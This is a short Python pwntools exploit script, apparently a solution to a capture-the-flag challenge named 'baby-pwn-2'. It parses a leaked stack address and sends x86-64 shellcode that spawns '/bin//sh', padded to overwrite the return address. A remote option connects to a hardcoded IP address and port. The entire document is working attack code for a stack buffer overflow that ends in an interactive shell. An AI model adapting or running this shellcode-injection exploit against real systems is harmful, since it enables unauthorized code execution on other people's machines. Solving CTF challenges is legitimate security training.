#!/usr/bin/env python3
# Local Ubuntu 22.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./baby-pwn-2"
elf  = ELF(BINARY, checksec=False)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "34.162.119.16"
  PORT = 5000
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil(b"leak: ")
stack_leak = int(s.recvuntil(b"\n"), 16)
print("stack_leak =", hex(stack_leak))

shellcode = b'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

buf  = shellcode
buf += b"A"*(72-len(buf))
buf += p64(stack_leak)
s.sendlineafter(b"text: ", buf)
  
s.interactive() 
